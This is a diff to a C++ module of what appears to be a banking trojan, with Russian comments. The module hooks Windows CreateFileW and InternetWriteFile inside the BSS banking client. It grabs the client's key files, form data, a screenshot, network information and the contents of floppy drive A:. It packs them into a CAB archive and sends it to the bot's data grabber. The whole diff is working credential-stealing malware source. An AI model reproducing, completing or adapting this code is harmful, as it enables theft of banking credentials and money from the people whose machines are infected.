@@ -1,6 +1,7 @@
 #include "BSS.h"
 
 #include "Loader.h"
+#include "Utils.h"
 
 #include "BotClasses.h"
 
@@ -9,38 +10,69 @@
 typedef struct
 {
 	HCAB hCab; 
-	bool Initialize;
 	char *Path;
 	bool Form;
 	DWORD dwEntry;
 	bool bFloppy;
-} BSS, *PBSS;
+} TBSSLog, *PBSSLog;
 
-PBSS pBanking;
-PList HashListBBS = NULL;
 
-bool bHookBSSCreateFileWOnce = false;
+typedef HANDLE ( WINAPI *BSSFUNC_CreateFileW	   )( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
+typedef BOOL   ( WINAPI *BSSFUNC_InternetWriteFile )( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten );
+
+BSSFUNC_InternetWriteFile REAL_BSSInternetWriteFile;
+BSSFUNC_CreateFileW	      REAL_BSSCreateFileW;
+
+bool     BSSHooksInitialized = false;
+DWORD    BSSGrabberPID = 0;
+PBSSLog  BSSLog = NULL;
+PList    HashListBBS = NULL;
+bool     HookBSSCreateFileWOnce = false;
+
+
+//-----------------------------------------------------------------------------
+void ClearBSSLog()
+{
+	// Очищаем структуру лога
+	if (BSSLog)
+	{
+		pDeleteFileA(BSSLog->Path);
+		STR::Free(BSSLog->Path);
+		FreeStruct(BSSLog);
+		BSSLog = NULL;
+	}
+}
+//-----------------------------------------------------------------------------
+
+
 
 bool InitializeBSS()
 {
-	
-	MemFree( pBanking );
-	pBanking = (PBSS)MemAlloc( sizeof( PBSS ) );
-	m_memset( pBanking, 0, sizeof( PBSS ) );	
-	if ( pBanking )
-	{		
-		pBanking->Path = File::GetTempNameA();
-		if ( pBanking->Path )
-		{
-			if ( ( pBanking->hCab = CreateCab( pBanking->Path ) ) != NULL )
-			{
-				pBanking->Initialize = true;
-				return true;
-			}
-		}
+	// Инициализируем BSS грабер
+
+	if (IsNewProcess(BSSGrabberPID))
+	{
+		BSSLog = NULL;
+		HashListBBS = NULL;
+		BSSHooksInitialized = false;
 	}
-	return false;
+
+    ClearBSSLog();
+
+	BSSLog = CreateStruct(TBSSLog);
+
+	// Создаём CAB архив
+	bool Initialized = false;
+	if (BSSLog)
+	{		
+		BSSLog->Path = File::GetTempNameA();
+		BSSLog->hCab = CreateCab(BSSLog->Path);
+		Initialized  = BSSLog->hCab != NULL;
+	}
+	return Initialized;
 }
+//-----------------------------------------------------------------------------
+
 
 bool IsBSSFileFormat( WCHAR *lpFileName )
 {
@@ -49,25 +81,17 @@ bool IsBSSFileFormat( WCHAR *lpFileName )
 							 0x1C3AE2, 0x18F96C, 0x1BF871,
 							 0x193133, 0x1C32ED, 0x1CB2F1, 0 };
 
-	DWORD dwHash = GetFileFormat( lpFileName );
+	DWORD Hash = GetFileFormat( lpFileName );
 
 	for ( DWORD i = 0; dwBssFormats[i] != 0; i++ )
 	{
-		if ( dwHash == dwBssFormats[i] )
-		{
+		if (Hash == dwBssFormats[i])
 			return true;
-		}
 	}
 
 	return false;	
 }
 
-
-typedef HANDLE ( WINAPI *BSSFUNC_CreateFileW	   )( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
-typedef BOOL   ( WINAPI *BSSFUNC_InternetWriteFile )( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten );
-
-BSSFUNC_InternetWriteFile REAL_BSSInternetWriteFile;
-BSSFUNC_CreateFileW	      REAL_BSSCreateFileW;
 
 void AddHashBBS(DWORD Hash)
 {
@@ -78,14 +102,16 @@ bool FindHashBBS(DWORD Hash)
 {
 	return List::IndexOf(HashListBBS, (LPVOID)Hash) >= 0;
 }
-
+//----------------------------------------------------------------------------
 
 HANDLE WINAPI HOOK_BSSCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
 {
 	HANDLE hRet = REAL_BSSCreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
 
+	if (!BSSLog) return hRet;
 
-	if ( IsBSSFileFormat( (WCHAR*)lpFileName ) && pBanking->Form )
+    // Проверяем формат файла
+	if (IsBSSFileFormat( (WCHAR*)lpFileName ) && BSSLog->Form )
 	{
 		WCHAR FileName[ MAX_PATH ];
 		plstrcpyW( FileName, lpFileName );
@@ -131,9 +157,9 @@ HANDLE WINAPI HOOK_BSSCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DW
 								PCHAR TempPathStr = WSTR::ToAnsi(TempPath, 0);
 								PCHAR FileNameStr = WSTR::ToAnsi(FileName, 0);
 
-								if ( AddFileToCab( pBanking->hCab, TempPathStr, FileNameStr ) )
+								if ( AddFileToCab( BSSLog->hCab, TempPathStr, FileNameStr ) )
 								{
-									pBanking->dwEntry++;
+									BSSLog->dwEntry++;
 								}
 								STR::Free(TempPathStr);
 								STR::Free(FileNameStr);
@@ -159,18 +185,22 @@ HANDLE WINAPI HOOK_BSSCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DW
 
 	return hRet; 
 }
+//----------------------------------------------------------------------------
 
 void HookBSSCreateFileW()
 {
-	UnhookCreateFileW();
-
-	if ( HookApi( 1, 0x8F8F102, &HOOK_BSSCreateFileW ) )
+	if (BSSHooksInitialized)
 	{
-		__asm mov [REAL_BSSCreateFileW], eax
-	}
+		if ( HookApi( 1, 0x8F8F102, &HOOK_BSSCreateFileW ) )
+		{
+			__asm mov [REAL_BSSCreateFileW], eax
 
-	return;
+			BSSHooksInitialized = true;
+		}
+    }
 }
+
+
 
 void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite )
 {
@@ -240,11 +270,12 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 							pCloseHandle( hLog );
 						}
 
+
 						if ( AddLog )
 						{
 							if ( InitializeBSS() )
 							{
-								if ( AddFileToCab( pBanking->hCab, TempFile, "Information.txt" ) )
+								if ( AddFileToCab( BSSLog->hCab, TempFile, "Information.txt" ) )
 								{
 									LPVOID lpScrFile = NULL;
 									DWORD dwScrSize = 0;
@@ -275,7 +306,7 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 
 									if ( bAddScreen )
 									{
-										AddFileToCab( pBanking->hCab, ScreenFile, "screen.jpeg" );
+										AddFileToCab( BSSLog->hCab, ScreenFile, "screen.jpeg" );
 									}
 
 									STR::Free( ScreenFile );
@@ -284,20 +315,20 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 
 									if ( NetFile != NULL )
 									{
-										AddFileToCab( pBanking->hCab, NetFile, "NetInfo.txt" );
+										AddFileToCab( BSSLog->hCab, NetFile, "NetInfo.txt" );
 										pDeleteFileA( NetFile );
 									}
 
 									STR::Free( NetFile );
 
 									pDeleteFileA( TempFile );
-									pBanking->Form = true;
+									BSSLog->Form = true;
 
 									pSetErrorMode( SEM_FAILCRITICALERRORS ); 
 
-									if ( AddDirToCab( pBanking->hCab, "A:", "Floppy" ) )
+									if ( AddDirToCab( BSSLog->hCab, "A:", "Floppy" ) )
 									{
-										pBanking->bFloppy = true;
+										BSSLog->bFloppy = true;
 									}
 
 									HookBSSCreateFileW();
@@ -316,35 +347,20 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 		}
 	}
 
-	if ( pBanking != NULL && pBanking->dwEntry )
+	if ( BSSLog != NULL && BSSLog->dwEntry )
 	{
 		UnhookCreateFileW();
 
-		if ( !pBanking->bFloppy )
+		if ( !BSSLog->bFloppy )
 		{
 			pSetErrorMode( SEM_FAILCRITICALERRORS ); 
-			AddDirToCab( pBanking->hCab, "A:", "Floppy" );
+			AddDirToCab( BSSLog->hCab, "A:", "Floppy" );
 		}
 
-		CloseCab( pBanking->hCab );
+		CloseCab(BSSLog->hCab);
 
-		DataGrabber::SendCabDelayed(NULL, pBanking->Path, "BSS");
-        pDeleteFileA(pBanking->Path);
-
-//		PBSSINIST pBank = (PBSSINIST)MemAlloc( sizeof( PBSSINIST ) );
-//
-//		if ( pBank )
-//		{
-//			pBank->dwType	= 1;
-//			pBank->FilePath = (char*)MemAlloc( m_lstrlen( pBanking->Path ) + 1 );
-//
-//			m_memcpy( pBank->FilePath, pBanking->Path, m_lstrlen( pBanking->Path ) );
-//
-//			StartThread( SendBSSInist, pBank );
-//		}
-
-		MemFree( pBanking );
-		pBanking = NULL;
+		DataGrabber::SendCabDelayed(NULL, BSSLog->Path, "BSS");
+		ClearBSSLog();
 	}
 }
 
